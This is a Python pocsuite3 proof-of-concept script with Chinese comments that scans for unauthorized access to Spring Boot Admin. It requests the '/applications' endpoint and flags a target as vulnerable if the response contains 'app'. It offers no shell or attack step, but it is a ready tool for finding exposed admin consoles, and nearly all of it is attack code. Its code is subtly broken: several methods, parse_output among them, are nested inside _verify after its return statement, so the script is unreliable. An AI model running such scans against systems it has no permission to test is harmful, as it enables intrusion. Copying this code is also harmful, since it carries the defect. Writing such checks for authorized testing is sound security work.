"""
作者 charis
时间 2023-1-9
"""
import time
import re
import os
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '5'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-09'
    updateDate = '2023-01-09'
    references = ['无']
    name = 'Spring boot admin 未授权访问漏洞'
    appPowerLink = 'https://spring.io/projects/spring-boot'
    appName = 'Spring boot admin'
    appVersion = 'Spring boot admin version all'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''Spring Boot Admin是一个社区项目，用于管理和监视您的Spring Boot®应用程序。 通过未授权的方式可以查看spring boot 的各个端点以及转存文件'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    # 定义检查方法
    def _check(self, url):
        payloads = [
            "/applications",
        ]

        # 获取原始数据
        flag = 'app'

        for payload in payloads:
            vul_url = url + payload.strip("\n")

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            try:
                r = requests.get(vul_url, headers=headers)
                if r.status_code == 200:
                    if flag in r.text:
                        return url, url + payload
            except requests.exceptions.RequestException as e:
                    pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


